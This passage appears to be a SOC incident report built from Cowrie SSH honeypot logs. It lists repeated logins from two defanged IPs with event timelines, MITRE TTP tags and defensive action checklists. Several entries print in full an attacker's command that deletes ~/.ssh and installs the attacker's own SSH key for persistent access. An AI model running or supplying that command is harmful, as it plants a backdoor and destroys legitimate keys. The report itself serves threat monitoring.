| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:01:55` | `cowrie.session.connect` |
| `2026-05-26 17:01:55` | `cowrie.client.version` |
| `2026-05-26 17:01:55` | `cowrie.client.kex` |
| `2026-05-26 17:01:57` | `cowrie.login.success` |
| `2026-05-26 17:01:58` | `cowrie.session.params` |
| `2026-05-26 17:01:58` | `cowrie.command.input` |
| `2026-05-26 17:01:58` | `cowrie.command.failed` |
| `2026-05-26 17:01:58` | `cowrie.log.closed` |
| `2026-05-26 17:01:59` | `cowrie.session.params` |
| `2026-05-26 17:01:59` | `cowrie.command.input` |
| `2026-05-26 17:01:59` | `cowrie.session.file_download` |
| `2026-05-26 17:01:59` | `cowrie.log.closed` |
| `2026-05-26 17:02:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7613b69aaaa

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:02 |
| **Last Seen** | 2026-05-26 17:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:02:03` | `cowrie.session.connect` |
| `2026-05-26 17:02:03` | `cowrie.client.version` |
| `2026-05-26 17:02:03` | `cowrie.client.kex` |
| `2026-05-26 17:02:04` | `cowrie.login.success` |
| `2026-05-26 17:02:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-143e7b57f9a4

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:04 |
| **Last Seen** | 2026-05-26 17:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:04:55` | `cowrie.session.connect` |
| `2026-05-26 17:04:55` | `cowrie.client.version` |
| `2026-05-26 17:04:55` | `cowrie.client.kex` |
| `2026-05-26 17:04:57` | `cowrie.login.success` |
| `2026-05-26 17:04:58` | `cowrie.session.params` |
| `2026-05-26 17:04:58` | `cowrie.command.input` |
| `2026-05-26 17:04:58` | `cowrie.command.failed` |
| `2026-05-26 17:04:58` | `cowrie.log.closed` |
| `2026-05-26 17:04:59` | `cowrie.session.params` |
| `2026-05-26 17:04:59` | `cowrie.command.input` |
| `2026-05-26 17:04:59` | `cowrie.session.file_download` |
| `2026-05-26 17:04:59` | `cowrie.log.closed` |
| `2026-05-26 17:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d6365ba59ec

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:05 |
| **Last Seen** | 2026-05-26 17:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:05:03` | `cowrie.session.connect` |
| `2026-05-26 17:05:03` | `cowrie.client.version` |
| `2026-05-26 17:05:03` | `cowrie.client.kex` |
| `2026-05-26 17:05:04` | `cowrie.login.success` |
| `2026-05-26 17:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a23f2f1f342

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:06 |
| **Last Seen** | 2026-05-26 17:06 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:06:38` | `cowrie.session.connect` |
| `2026-05-26 17:06:38` | `cowrie.client.version` |
| `2026-05-26 17:06:39` | `cowrie.client.kex` |
| `2026-05-26 17:06:40` | `cowrie.login.success` |
| `2026-05-26 17:06:41` | `cowrie.session.params` |
| `2026-05-26 17:06:41` | `cowrie.command.input` |
| `2026-05-26 17:06:41` | `cowrie.command.failed` |
| `2026-05-26 17:06:41` | `cowrie.log.closed` |
| `2026-05-26 17:06:41` | `cowrie.session.params` |
| `2026-05-26 17:06:41` | `cowrie.command.input` |
| `2026-05-26 17:06:41` | `cowrie.session.file_download` |
| `2026-05-26 17:06:41` | `cowrie.log.closed` |
| `2026-05-26 17:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe9dbbc7f1eb

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:06 |
| **Last Seen** | 2026-05-26 17:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:06:44` | `cowrie.session.connect` |
| `2026-05-26 17:06:44` | `cowrie.client.version` |
| `2026-05-26 17:06:45` | `cowrie.client.kex` |
| `2026-05-26 17:06:49` | `cowrie.login.success` |
| `2026-05-26 17:06:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-326dc5b4f25c

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:07 |
| **Last Seen** | 2026-05-26 17:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:07:51` | `cowrie.session.connect` |
| `2026-05-26 17:07:51` | `cowrie.client.version` |
| `2026-05-26 17:07:51` | `cowrie.client.kex` |
| `2026-05-26 17:07:52` | `cowrie.login.success` |
| `2026-05-26 17:07:53` | `cowrie.session.params` |
| `2026-05-26 17:07:53` | `cowrie.command.input` |
| `2026-05-26 17:07:53` | `cowrie.command.failed` |
| `2026-05-26 17:07:53` | `cowrie.log.closed` |
| `2026-05-26 17:07:53` | `cowrie.session.params` |
| `2026-05-26 17:07:53` | `cowrie.command.input` |
| `2026-05-26 17:07:54` | `cowrie.session.file_download` |
| `2026-05-26 17:07:54` | `cowrie.log.closed` |
| `2026-05-26 17:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7317f9ca6db3

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:07 |
| **Last Seen** | 2026-05-26 17:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:07:57` | `cowrie.session.connect` |
| `2026-05-26 17:07:58` | `cowrie.client.version` |
| `2026-05-26 17:07:58` | `cowrie.client.kex` |
| `2026-05-26 17:07:59` | `cowrie.login.success` |
| `2026-05-26 17:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e10e854547e

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:09 |
| **Last Seen** | 2026-05-26 17:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:09:03` | `cowrie.session.connect` |
| `2026-05-26 17:09:03` | `cowrie.client.version` |
| `2026-05-26 17:09:03` | `cowrie.client.kex` |
| `2026-05-26 17:09:04` | `cowrie.login.success` |
| `2026-05-26 17:09:05` | `cowrie.session.params` |
| `2026-05-26 17:09:05` | `cowrie.command.input` |
| `2026-05-26 17:09:05` | `cowrie.command.failed` |
| `2026-05-26 17:09:06` | `cowrie.log.closed` |
| `2026-05-26 17:09:06` | `cowrie.session.params` |
| `2026-05-26 17:09:06` | `cowrie.command.input` |
| `2026-05-26 17:09:06` | `cowrie.session.file_download` |
| `2026-05-26 17:09:06` | `cowrie.log.closed` |
| `2026-05-26 17:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ff6bbf1d50e

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:09 |
| **Last Seen** | 2026-05-26 17:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:09:09` | `cowrie.session.connect` |
| `2026-05-26 17:09:09` | `cowrie.client.version` |
| `2026-05-26 17:09:09` | `cowrie.client.kex` |
| `2026-05-26 17:09:13` | `cowrie.login.success` |
| `2026-05-26 17:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95176d17b3e9

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:09 |
| **Last Seen** | 2026-05-26 17:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:09:55` | `cowrie.session.connect` |
| `2026-05-26 17:09:55` | `cowrie.client.version` |
| `2026-05-26 17:09:55` | `cowrie.client.kex` |
| `2026-05-26 17:09:56` | `cowrie.login.success` |
| `2026-05-26 17:09:57` | `cowrie.session.params` |
| `2026-05-26 17:09:57` | `cowrie.command.input` |
| `2026-05-26 17:09:57` | `cowrie.command.failed` |
| `2026-05-26 17:09:58` | `cowrie.log.closed` |
| `2026-05-26 17:09:58` | `cowrie.session.params` |
| `2026-05-26 17:09:58` | `cowrie.command.input` |
| `2026-05-26 17:09:58` | `cowrie.session.file_download` |
| `2026-05-26 17:09:58` | `cowrie.log.closed` |
| `2026-05-26 17:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a533028f7d

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:10 |
| **Last Seen** | 2026-05-26 17:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:10:02` | `cowrie.session.connect` |
| `2026-05-26 17:10:02` | `cowrie.client.version` |
| `2026-05-26 17:10:03` | `cowrie.client.kex` |
| `2026-05-26 17:10:04` | `cowrie.login.success` |
| `2026-05-26 17:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5942d48dbad1

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:10 |
| **Last Seen** | 2026-05-26 17:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:10:14` | `cowrie.session.connect` |
| `2026-05-26 17:10:15` | `cowrie.client.version` |
| `2026-05-26 17:10:15` | `cowrie.client.kex` |
| `2026-05-26 17:10:16` | `cowrie.login.success` |
| `2026-05-26 17:10:16` | `cowrie.session.params` |
| `2026-05-26 17:10:16` | `cowrie.command.input` |
| `2026-05-26 17:10:16` | `cowrie.command.failed` |
| `2026-05-26 17:10:16` | `cowrie.log.closed` |
| `2026-05-26 17:10:17` | `cowrie.session.params` |
| `2026-05-26 17:10:17` | `cowrie.command.input` |
| `2026-05-26 17:10:17` | `cowrie.session.file_download` |
| `2026-05-26 17:10:17` | `cowrie.log.closed` |
| `2026-05-26 17:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b5eccf1989f

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:10 |
| **Last Seen** | 2026-05-26 17:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:10:19` | `cowrie.session.connect` |
| `2026-05-26 17:10:20` | `cowrie.client.version` |
| `2026-05-26 17:10:20` | `cowrie.client.kex` |
| `2026-05-26 17:10:22` | `cowrie.login.success` |
| `2026-05-26 17:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5290080c852d

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:10 |
| **Last Seen** | 2026-05-26 17:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:10:49` | `cowrie.session.connect` |
| `2026-05-26 17:10:49` | `cowrie.client.version` |
| `2026-05-26 17:10:50` | `cowrie.client.kex` |
| `2026-05-26 17:10:51` | `cowrie.login.success` |
| `2026-05-26 17:10:52` | `cowrie.session.params` |
| `2026-05-26 17:10:52` | `cowrie.command.input` |
| `2026-05-26 17:10:52` | `cowrie.command.failed` |
| `2026-05-26 17:10:52` | `cowrie.log.closed` |
| `2026-05-26 17:10:53` | `cowrie.session.params` |
| `2026-05-26 17:10:53` | `cowrie.command.input` |
| `2026-05-26 17:10:53` | `cowrie.session.file_download` |
| `2026-05-26 17:10:53` | `cowrie.log.closed` |
| `2026-05-26 17:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24cafdaba245

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:10 |
| **Last Seen** | 2026-05-26 17:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:10:57` | `cowrie.session.connect` |
| `2026-05-26 17:10:57` | `cowrie.client.version` |
| `2026-05-26 17:10:57` | `cowrie.client.kex` |
| `2026-05-26 17:10:59` | `cowrie.login.success` |
| `2026-05-26 17:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad4f209a0122

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:11 |
| **Last Seen** | 2026-05-26 17:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:11:22` | `cowrie.session.connect` |
| `2026-05-26 17:11:23` | `cowrie.client.version` |
| `2026-05-26 17:11:23` | `cowrie.client.kex` |
| `2026-05-26 17:11:24` | `cowrie.login.success` |
| `2026-05-26 17:11:24` | `cowrie.session.params` |
| `2026-05-26 17:11:24` | `cowrie.command.input` |
